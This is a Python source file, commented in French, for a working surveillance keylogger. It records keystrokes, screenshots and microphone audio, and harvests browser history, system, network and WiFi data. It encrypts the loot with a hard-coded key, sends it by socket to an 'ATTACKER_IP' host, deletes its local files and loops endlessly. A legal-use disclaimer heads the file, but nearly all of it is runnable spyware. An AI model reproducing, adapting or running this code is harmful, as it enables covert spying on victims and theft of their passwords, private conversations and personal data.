# pylint: disable=E1101,I1101,W0106
"""
This tool may be used for legal purposes only.
Users take full responsibility for any actions performed using this tool.
The author accepts no liability for damage caused by this tool.
If these terms are not acceptable to you, then do not use this tool.
"""

import json
import logging
import os
import re
import shutil
import socket
import sys
import tarfile
import time
import subprocess  # IMPORT CRITIQUE AJOUTÉ
from multiprocessing import Process
from pathlib import Path
from subprocess import check_output, Popen, TimeoutExpired
from threading import Thread

# External Modules #
import browserhistory as bh
import requests
from cryptography.fernet import Fernet
from pynput.keyboard import Listener

# Import optionnels avec gestion d'erreur robuste
try:
    from PIL import ImageGrab
    PILLOW_AVAILABLE = True
except ImportError:
    PILLOW_AVAILABLE = False
    print("⚠ Pillow non disponible - screenshots désactivés")

try:
    import sounddevice
    from scipy.io.wavfile import write as write_rec
    SOUNDDEVICE_AVAILABLE = True
except ImportError:
    SOUNDDEVICE_AVAILABLE = False
    print("⚠ SoundDevice/Scipy non disponible - microphone désactivé")

# Configuration
ATTACKER_IP = "192.168.56.11"
ATTACKER_PORT = 8888
KEY = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

def network_transfer_single_file(file_path: Path, file_type="DATA"):
    """Transfère un seul fichier avec son type"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(30)
            print(f"🔗 Connexion à {ATTACKER_IP}:{ATTACKER_PORT}...")
            sock.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Envoyer le type de fichier d'abord
            file_type_encoded = file_type.encode('utf-8')
            sock.send(len(file_type_encoded).to_bytes(4, byteorder='big'))
            sock.send(file_type_encoded)
            
            # Envoyer le nom du fichier
            filename = file_path.name.encode('utf-8')
            sock.send(len(filename).to_bytes(4, byteorder='big'))
            sock.send(filename)
            
            # Envoyer la taille
            file_size = file_path.stat().st_size
            sock.send(file_size.to_bytes(8, byteorder='big'))
            
            # Envoyer le fichier
            with open(file_path, 'rb') as f:
                total_sent = 0
                while True:
                    data = f.read(4096)
                    if not data:
                        break
                    sent = sock.send(data)
                    total_sent += sent
            
            print(f"✅ {file_path.name} envoyé ({total_sent} octets)")
            return True
            
    except Exception as e:
        print(f"❌ Erreur transfert {file_path.name}: {e}")
        return False
# Ajoutez cette fonction dans le keylogger
def transfer_audio_files(export_path: Path, session_id: str):
    """Transfère les fichiers audio individuellement"""
    audio_files = list(export_path.glob('*mic_recording*'))
    if not audio_files:
        print("⚠ Aucun fichier audio à transférer")
        return False
        
    try:
        success_count = 0
        total_files = len(audio_files)
        
        for audio_file in audio_files:
            if audio_file.is_file():
                # Chiffrer le fichier audio
                crypt_path = export_path / f'e_{audio_file.name}'
                try:
                    with audio_file.open('rb') as plain_text:
                        data = plain_text.read()
                    encrypted = Fernet(KEY).encrypt(data)
                    with crypt_path.open('wb') as hidden_data:
                        hidden_data.write(encrypted)
                    audio_file.unlink()
                    
                    # Transférer le fichier chiffré
                    if network_transfer_single_file(crypt_path, "AUDIO"):
                        success_count += 1
                    crypt_path.unlink()  # Nettoyer
                    print(f"✅ {audio_file.name} audio envoyé")
                except Exception as e:
                    print(f"❌ Erreur audio {audio_file.name}: {e}")
        
        print(f"🎵 {success_count}/{total_files} fichiers audio envoyés")
        return success_count > 0
        
    except Exception as e:
        print(f"❌ Erreur transfert audio: {e}")
        return False

def encrypt_and_transfer_files(export_path: Path, session_id: str):
    """
    Chiffre et transfère les fichiers sans créer d'archive TAR
    """
    try:
        # Liste des fichiers à transférer
        files_to_send = []
        
        # Fichiers système principaux
        main_files = ['network_info.txt', 'system_info.txt', 'browser_info.txt', 'key_logs.txt', 'wifi_info.txt']
        for file in main_files:
            file_path = export_path / file
            if file_path.exists():
                # Chiffrer le fichier
                crypt_path = export_path / f'e_{file}'
                try:
                    with file_path.open('rb') as plain_text:
                        data = plain_text.read()
                    encrypted = Fernet(KEY).encrypt(data)
                    with crypt_path.open('wb') as hidden_data:
                        hidden_data.write(encrypted)
                    file_path.unlink()
                    files_to_send.append(crypt_path)
                    print(f"✅ {file} chiffré")
                except Exception as e:
                    print(f"❌ Erreur chiffrement {file}: {e}")
        
        # Transférer chaque fichier chiffré individuellement
        success_count = 0
        for file_path in files_to_send:
            if network_transfer_single_file(file_path, "MAIN_DATA"):
                success_count += 1
            file_path.unlink()  # Nettoyer après envoi
        
        print(f"📡 {success_count}/{len(files_to_send)} fichiers principaux envoyés")
        return success_count > 0
        
    except Exception as e:
        print(f"❌ Erreur transfert fichiers: {e}")
        return False

def transfer_screenshots(screenshot_dir: Path, session_id: str):
    """Transfère les screenshots individuellement"""
    if not screenshot_dir.exists() or not any(screenshot_dir.iterdir()):
        print("⚠ Aucun screenshot à transférer")
        return False
        
    try:
        success_count = 0
        total_files = 0
        
        for screenshot_file in screenshot_dir.iterdir():
            if screenshot_file.is_file() and screenshot_file.suffix.lower() in ['.png', '.jpg', '.jpeg']:
                total_files += 1
                if network_transfer_single_file(screenshot_file, "SCREENSHOT"):
                    success_count += 1
                screenshot_file.unlink()  # Nettoyer après envoi
        
        print(f"🖼 {success_count}/{total_files} screenshots envoyés")
        return success_count > 0
        
    except Exception as e:
        print(f"❌ Erreur transfert screenshots: {e}")
        return False

def microphone(mic_path: Path):
    """Enregistrement microphone avec format WAV standard"""
    if not SOUNDDEVICE_AVAILABLE:
        print("❌ Microphone désactivé (sounddevice manquant)")
        return False
        
    try:
        # Paramètres standards pour compatibilité
        frames_per_second = 22050  # Réduit pour meilleure compatibilité
        seconds = 8
        channels = 1
        dtype = 'int16'  # Format standard

        print(f"🎤 Enregistrement {seconds}s à {frames_per_second}Hz...")
        
        # Nom de fichier simple
        rec_name = mic_path / 'audio.wav'
        
        # Enregistrement
        recording = sounddevice.rec(
            int(seconds * frames_per_second),
            samplerate=frames_per_second,
            channels=channels,
            dtype=dtype
        )
        
        print("⏳ Enregistrement en cours...")
        sounddevice.wait()
        print("✅ Enregistrement terminé")
        
        # Sauvegarde
        write_rec(str(rec_name), frames_per_second, recording)
        
        # Vérification
        if rec_name.exists() and rec_name.stat().st_size > 1000:
            print(f"✅ Fichier audio créé: {rec_name.stat().st_size} octets")
            return True
        else:
            print("❌ Fichier audio trop petit ou non créé")
            return False
            
    except Exception as e:
        print(f"❌ Erreur microphone: {e}")
        return False

def screenshot(screenshot_path: Path):
    """Capture d'écran avec gestion d'erreurs"""
    if not PILLOW_AVAILABLE:
        print("❌ Screenshots désactivés (Pillow manquant)")
        return
        
    try:
        screenshot_path.mkdir(parents=True, exist_ok=True)
        print("📸 Capture d'écran en cours...")

        for current in range(1, 4):  # Augmenté à 3 screenshots
            try:
                pic = ImageGrab.grab()
                capture_path = screenshot_path / f'{current}_screenshot.png'
                pic.save(capture_path)
                print(f"✅ Screenshot {current} sauvegardé")
                time.sleep(3)  # Plus d'espace entre les screenshots
            except Exception as e:
                print(f"❌ Erreur screenshot {current}: {e}")
            
    except Exception as e:
        print(f"❌ Erreur générale screenshot: {e}")

def log_keys(key_path: Path):
    """Enregistrement des frappes clavier amélioré"""
    try:
        key_path.parent.mkdir(parents=True, exist_ok=True)
        
        def on_press(key):
            try:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                
                # Gestion spéciale des touches
                if hasattr(key, 'char') and key.char is not None:
                    key_data = f"'{key.char}'"
                elif key == key.space:
                    key_data = "[ESPACE]"
                elif key == key.enter:
                    key_data = "[ENTREE]"
                elif key == key.backspace:
                    key_data = "[RETOUR]"
                elif key == key.tab:
                    key_data = "[TAB]"
                elif key == key.esc:
                    key_data = "[ECHAP]"
                elif key == key.shift:
                    key_data = "[SHIFT]"
                elif key == key.ctrl_l or key == key.ctrl_r:
                    key_data = "[CTRL]"
                elif key == key.alt_l or key == key.alt_r:
                    key_data = "[ALT]"
                else:
                    key_data = f"[{str(key).replace('Key.', '')}]"
                
                # Écrire dans le fichier
                with open(key_path, 'a', encoding='utf-8') as f:
                    f.write(f"{timestamp} - {key_data}\n")
                    
            except Exception as e:
                print(f"❌ Erreur touche: {e}")
        
        print("⌨ Keylogger actif (tapez Ctrl+C pour arrêter)...")
        
        with Listener(on_press=on_press) as listener:
            listener.join()
            
    except Exception as e:
        print(f"❌ Erreur keylogger: {e}")

def get_browser_history(browser_file: Path):
    """Récupère l'historique du navigateur SIMPLIFIÉ"""
    try:
        print("🌐 Récupération historique navigateur...")
        
        browser_data = {
            "timestamp": time.time(),
            "status": "success",
            "data": {}
        }
        
        try:
            # Essayer browserhistory
            hist = bh.get_browserhistory()
            browser_data["data"]["history"] = hist
            browser_data["method"] = "browserhistory"
            print("✅ Historique récupéré avec browserhistory")
            
        except Exception as bh_error:
            print(f"⚠ browserhistory échoué: {bh_error}")
            browser_data["status"] = "partial"
            browser_data["error"] = str(bh_error)
            
            # Méthode fallback
            try:
                # Chercher les dossiers de navigateurs
                browsers = {
                    "chrome": "~/.config/google-chrome",
                    "chromium": "~/.config/chromium", 
                    "firefox": "~/.mozilla/firefox"
                }
                
                found_browsers = {}
                for name, path in browsers.items():
                    expanded_path = Path(path).expanduser()
                    if expanded_path.exists():
                        found_browsers[name] = str(expanded_path)
                
                browser_data["data"]["found_browsers"] = found_browsers
                browser_data["method"] = "fallback"
                print("✅ Navigateurs trouvés avec méthode fallback")
                
            except Exception as fallback_error:
                print(f"⚠ Fallback échoué: {fallback_error}")

        # Sauvegarder
        with browser_file.open('w', encoding='utf-8') as f:
            json.dump(browser_data, f, indent=2, ensure_ascii=False)
            
        print("✅ Données navigateur sauvegardées")
        
    except Exception as e:
        print(f"❌ Erreur historique navigateur: {e}")

def get_system_info(sysinfo_file: Path):
    """Récupère les informations système POUR KALI - CORRIGÉ"""
    try:
        print("💻 Récupération informations système...")
        
        commands = {
            "hostname": "hostname",
            "system_info": "uname -a",
            "cpu_info": "lscpu | head -20",
            "memory": "free -h",
            "disk": "df -h",
            "users": "who",
            "processes": "ps aux | head -15"
        }
        
        with sysinfo_file.open('w', encoding='utf-8') as system_info:
            system_info.write("=== INFORMATIONS SYSTÈME KALI LINUX ===\n\n")
            
            for name, cmd in commands.items():
                system_info.write(f"\n=== {name.upper()} ===\n")
                try:
                    # CORRECTION: Utilisation correcte de subprocess
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                    if result.returncode == 0:
                        system_info.write(result.stdout)
                    else:
                        system_info.write(f"Erreur commande: {result.stderr}\n")
                except subprocess.TimeoutExpired:
                    system_info.write("⏰ Timeout\n")
                except Exception as cmd_error:
                    system_info.write(f"Erreur: {cmd_error}\n")
                
                system_info.write("\n" + "="*50 + "\n")
        
        print("✅ Informations système récupérées")
                
    except Exception as e:
        print(f"❌ Erreur informations système: {e}")

def get_network_info(export_path: Path, network_file: Path):
    """Récupère les informations réseau POUR KALI - CORRIGÉ"""
    try:
        print("🌐 Récupération informations réseau...")
        
        commands = {
            "interfaces": "ip addr",
            "routing": "ip route",
            "connections": "ss -tuln",
            "arp": "arp -a",
            "dns": "cat /etc/resolv.conf"
        }

        with network_file.open('w', encoding='utf-8') as network_io:
            network_io.write("=== INFORMATIONS RÉSEAU KALI LINUX ===\n\n")
            
            for name, cmd in commands.items():
                network_io.write(f"\n=== {name.upper()} ===\n")
                try:
                    # CORRECTION: Utilisation correcte de subprocess
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                    if result.returncode == 0:
                        network_io.write(result.stdout)
                    else:
                        network_io.write(f"Erreur: {result.stderr}\n")
                except Exception as cmd_error:
                    network_io.write(f"Erreur: {cmd_error}\n")
                
                network_io.write("\n" + "="*50 + "\n")

            # Informations IP
            hostname = socket.gethostname()
            try:
                ip_addr = socket.gethostbyname(hostname)
            except:
                ip_addr = "Non disponible"

            try:
                public_ip = requests.get('https://api.ipify.org', timeout=10).text
            except:
                public_ip = 'Non disponible'

            network_io.write(f"\n=== RÉSUMÉ IP ===\n")
            network_io.write(f"Hostname: {hostname}\n")
            network_io.write(f"IP Publique: {public_ip}\n")
            network_io.write(f"IP Local: {ip_addr}\n")

        print("✅ Informations réseau récupérées")
            
    except Exception as e:
        print(f"❌ Erreur informations réseau: {e}")

def linux_wifi_query(export_path: Path):
    """Récupère les informations WiFi POUR KALI - CORRIGÉ"""
    try:
        print("📶 Récupération informations WiFi...")
        wifi_path = export_path / 'wifi_info.txt'

        with wifi_path.open('w', encoding='utf-8') as wifi_file:
            wifi_file.write("=== INFORMATIONS WIFI KALI LINUX ===\n\n")
            
            wifi_commands = {
                "wifi_list": "nmcli dev wifi",
                "connections": "nmcli connection show",
                "interfaces": "iwconfig 2>/dev/null || echo 'iwconfig non disponible'"
            }
            
            for name, cmd in wifi_commands.items():
                wifi_file.write(f"\n=== {name.upper()} ===\n")
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        wifi_file.write(result.stdout)
                    else:
                        wifi_file.write(f"Erreur: {result.stderr}\n")
                except Exception as cmd_error:
                    wifi_file.write(f"Erreur: {cmd_error}\n")
                wifi_file.write("\n" + "="*50 + "\n")

        print("✅ Informations WiFi récupérées")
            
    except Exception as e:
        print(f"❌ Erreur informations WiFi: {e}")

def main():
    # Créer le dossier temporaire avec ID de session unique
    session_id = str(int(time.time()))
    export_path = Path(f'/tmp/logs_{session_id}/')
    export_path.mkdir(parents=True, exist_ok=True)
    print(f"📁 Dossier de travail: {export_path} (Session: {session_id})")

    # Fichiers de sortie
    network_file = export_path / 'network_info.txt'
    sysinfo_file = export_path / 'system_info.txt'
    browser_file = export_path / 'browser_info.txt'
    log_file = export_path / 'key_logs.txt'
    wifi_file = export_path / 'wifi_info.txt'
    screenshot_dir = export_path / 'Screenshots'

    print("🔍 Début de la collecte des données...")

    # Collecte des données de base (système, réseau, navigateur, wifi)
    print("🔄 Collecte données système...")
    get_system_info(sysinfo_file)
    
    print("🔄 Collecte données réseau...")
    get_network_info(export_path, network_file)
    
    print("🔄 Collecte données WiFi...")
    linux_wifi_query(export_path)
    
    print("🔄 Collecte historique navigateur...")
    get_browser_history(browser_file)

    print("🚀 Démarrage des modules de surveillance...")

    # Démarrer les processus de monitoring
    processes = []
    
    # Keylogger (toujours actif)
    proc_1 = Process(target=log_keys, args=(log_file,))
    proc_1.start()
    processes.append(proc_1)

    # Screenshots (optionnel)
    if PILLOW_AVAILABLE:
        proc_2 = Thread(target=screenshot, args=(screenshot_dir,))
        proc_2.start()
        processes.append(proc_2)

    # Microphone (optionnel)
    if SOUNDDEVICE_AVAILABLE:
        proc_3 = Thread(target=microphone, args=(export_path,))
        proc_3.start()
        processes.append(proc_3)

    # Attente de fin (60 secondes pour laisser plus de temps)
    print("⏳ Collecte en cours (60 secondes)...")
    timeout = 60
    
    for proc in processes:
        if hasattr(proc, 'join'):
            proc.join(timeout=timeout)
        if hasattr(proc, 'terminate'):
            try:
                proc.terminate()
            except:
                pass

    # Transfert des données SANS ARCHIVES TAR
    print("📡 Envoi des données...")
    
    # Transférer les fichiers principaux
    main_success = encrypt_and_transfer_files(export_path, session_id)
    audio_success = transfer_audio_files(export_path, session_id)
    # Transférer les screenshots
    screenshot_success = transfer_screenshots(screenshot_dir, session_id)
    print(f"📊 Résumé transfert: Main={main_success}, Audio={audio_success}, Screenshots={screenshot_success}")
    # Nettoyage
    print("🧹 Nettoyage...")
    try:
        shutil.rmtree(export_path, ignore_errors=True)
    except:
        pass

    print("✅ Cycle terminé")
    print(f"🔄 Redémarrage dans 30 secondes... (Session: {session_id})")
    time.sleep(30)
    print("\n" + "="*50)
    main()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n⏹ Arrêt demandé par l\'utilisateur')
        sys.exit(0)
    except Exception as ex:
        print(f'\n❌ Erreur critique: {ex}')
        import traceback
        traceback.print_exc()
        sys.exit(1)
